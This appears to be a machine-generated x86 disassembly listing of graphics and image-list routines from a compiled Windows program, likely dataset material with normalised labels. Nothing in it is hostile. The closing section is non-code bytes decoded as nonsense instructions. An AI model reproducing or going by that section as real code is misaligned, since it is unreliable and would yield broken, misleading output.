mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_4566e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_4564dc
push eax
mov eax ebx
call sub_456f5c
call sub_4564dc
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_425280
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4568b4
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_4299e0
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_424a38
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_4170c4
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_4299e0
pop edx
call sub_424e6c
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_4299e0
call sub_425280
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4568b4
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_4170c4
mov eax [ ebx + 0x54 ]
call sub_4299e0
call sub_425280
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_424a38
mov eax edi
call sub_425280
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_424a38
mov eax edi
call sub_425280
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_42a89c
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_457158
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_45717c
pop ebx
pop ebp
retn 0xc
sub_45717c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4566e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_4571c8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_4170c4
mov eax [ ebp - 0x4 ]
call sub_457e5c
xor eax eax
push ebp
push sub_457361
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_457344
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_457327
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_42a89c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45732e
mov eax [ ebp - 0x10 ]
call sub_403128
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_4299e0
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_424e6c
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_425280
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_4299e0
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_424e6c
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_425280
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4569f0
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_457370
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4568b4
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_4571c8
sub_457390
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
call sub_456918
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418d14
mov eax ebx
call sub_456f18
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_457578
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_4568b4
mov edx eax
mov eax ebx
call sub_4567b8
mov eax ebx
call sub_4566e0
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_4568b4
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_4566e8
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4568b4
push eax
call ImageList_GetBkColor
call sub_4564fc
mov edx eax
mov eax ebx
call sub_456f24
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_457370
jmp r-xdata
sub_457450
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418df8
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_457578
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_456f18
mov eax esi
call sub_4568b4
mov edx eax
mov eax ebx
call sub_4567b8
mov eax ebx
call sub_4566e0
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_4568b4
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_4566e8
jmp r-xdata
mov eax esi
call sub_4568b4
push eax
call ImageList_GetBkColor
call sub_4564fc
mov edx eax
mov eax ebx
call sub_456f24
mov edx esi
mov eax ebx
call sub_457370
pop esi
pop ebx
retn
sub_457500
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45756c
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457573
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7fc
call sub_4038f4
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_4575a0
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_418700
mov si 0xffff
call sub_403324
inc ebp
dec edi
jne r-xdata
sub_4575f0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4185f0
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418700
cmp ebp eax
jne r-xdata
sub_457648
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407e00
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45768c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_456c40
mov ebx eax
mov eax edi
call sub_456c40
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_456c40
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_457768
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45774b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_457648
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457752
mov eax [ ebp - 0xc ]
call sub_403128
retn
mov eax edi
call sub_456c40
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_45777c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_456c40
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_45768c
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_4577d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4210b0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_45777c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_457830
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41b014
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41b014
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_457ab4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41ade8
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41ae08
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_457a97
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42a89c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_4170c4
mov eax [ ebp - 0x4 ]
call sub_457e5c
xor eax eax
push ebp
push sub_457a7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457a81
mov eax [ ebp - 0xc ]
call sub_403128
mov eax [ ebp - 0x14 ]
call sub_403128
mov eax [ ebp - 0x4 ]
call sub_457e60
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_4170ec
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4299e0
push eax
mov eax [ ebp - 0xc ]
call sub_4299e0
lea edx [ ebp - 0x30 ]
pop ecx
call sub_424d38
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_4170ec
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4299e0
push eax
mov eax [ ebp - 0x14 ]
call sub_4299e0
lea edx [ ebp - 0x30 ]
pop ecx
call sub_424d38
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4569f0
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_457ac4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421844
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_457b24
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_456878
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457b2b
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub eax 0xffffffec
sub_457b2b
mov eax [ ebp - 0x4 ]
call sub_4566e0
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_457c5a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41ae08
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41b574
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41ae08
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403128
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41ae08
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421844
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_457c3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41ae08
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_456878
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41ae08
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_457c8c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_456918
mov eax edi
call sub_41ade8
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41ae08
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_457830
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_457ac4
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_457d18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_421844
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_457e12
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40c04c
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_4568b4
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_4568b4
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457e19
mov eax [ ebp - 0x4 ]
call sub_403128
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
jmp r-xdata
sub_457e80
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
mov edx esi
call sub_4575f0
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_457ecc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_457ef1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457ef8
retn
sub_45854e
in al dx
mov edi 0x45
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
adc [ eax ] al
cmp eax 0xfcff0000
mov ebp 0x10045
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0xc86d6574
pop eax
inc ecx
add [ eax ] ah
add bh bh
mov eax 0xc02c0045
outsd
dec ecx
je r-xdata
js r-xdata
cwde
add [ eax ] al
inc ebx
jne r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
insd
enter 0x4158 0x0
pushad
add [ eax ] al
jmp [ eax + edi * 4 + 0x45 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
sub al 0xc0
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
int3
inc ecx
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
add [ eax ] al
ja r-xdata
or eax 0x33840042
inc eax
add [ eax + 0x33 ] bh
xor eax [ eax ]
cld
ja r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
add [ esi - 0x79 ] cl
inc ebp
add [ edx - 0x79 ] ah
inc ebp
add [ eax ] bl
add [ eax ] al
mov al 0x6d
je r-xdata
test al 0x11
inc edx
add [ eax - 0x23ffbdef ] ah
adc al 0x42
jb r-xdata
cmp al 0x87
inc ebp
add [ edi + eax * 4 + 0x45 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
insd
pushad
add [ ebp ] 0x98
add [ eax ] al
[ eax + 0x1ff0000 ]
xor eax [ eax ]
js r-xdata
jae r-xdata
insd
fadd [ eax + 0xa00045 ]
add bh bh
mov al [ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
add [ edx + ecx * 8 - 0x2cb7ffbb ] bl
inc ebp
add [ ebx + ecx * 8 - 0x2c87ffbb ] cl
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
inc ebp
add [ eax - 0x6fffbdef ] bl
dec ecx
je r-xdata
adc [ edx ] eax
fcom [ edx + eax * 2 ]
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bh

adc al [ edx ]
aam 0x14
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
nop
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
lea eax [ eax ]
add [ edi + 0x45 ] al
sub_4587ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
mov [ ebp ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax + 0x600045 ] cl
add [ eax ] al
mov ah 0x86
inc ebp
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bh

sub_4587f2
inc ebp
add al bh
lea eax [ ecx ]
mov al 0x10
inc edx
add [ ecx * 4 - 0x2c9fffbf ] dl
inc ebp
add ah bh
rol [ ebp ] cl
cwde
adc [ edx ] eax
nop
adc al [ edx ]
aam 0x14
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ edx + ecx * 8 - 0x2cb7ffbb ] bl
inc ebp
add [ eax ] bh
fld [ ebp ]
jl r-xdata
inc ebp
add [ eax - 0x6fffbdef ] bl
